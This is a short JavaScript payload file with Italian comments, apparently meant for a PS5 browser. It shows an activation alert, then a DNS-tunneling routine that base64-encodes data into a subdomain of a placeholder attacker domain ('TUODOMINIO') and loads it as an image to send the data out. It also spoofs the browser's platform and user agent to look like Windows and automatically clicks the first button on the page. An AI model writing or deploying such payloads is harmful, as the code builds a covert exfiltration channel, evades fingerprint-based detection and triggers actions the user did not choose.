// payload.js
alert("✅ Payload attivato su PS5!");

// DNS tunneling demo
let data = btoa("test_ps5_payload");
let img = document.createElement("img");
img.src = "http://" + data + ".tunnel.TUODOMINIO.com";
document.body.appendChild(img);

// Fingerprint cloaking
Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
Object.defineProperty(navigator, 'userAgent', { get: () => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' });

// Auto-click su primo bottone
let btn = document.querySelector("button");
if (btn) btn.click();
